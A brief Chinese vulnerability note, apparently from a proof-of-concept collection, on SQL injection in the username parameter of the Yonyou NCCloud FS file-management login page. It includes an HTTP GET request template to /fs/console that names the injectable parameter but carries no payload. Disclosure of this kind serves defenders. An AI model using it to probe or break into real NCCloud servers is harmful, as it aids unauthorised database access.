# 用友 NCCloud FS文件管理SQL注入

用友 NCCloud FS文件管理登录页面对用户名参数没有过滤，存在SQL注入.

poc:

```
GET /fs/console?username=123&password=%2F7Go4Iv2Xqlml0WjkQvrvzX%2FgBopF8XnfWPUk69fZs0%3D HTTP/1.1
Host: 
...
//登录处username参数
```

from:https://mp.weixin.qq.com/s/jb7XeLGvdyNrF1xQFsXDjA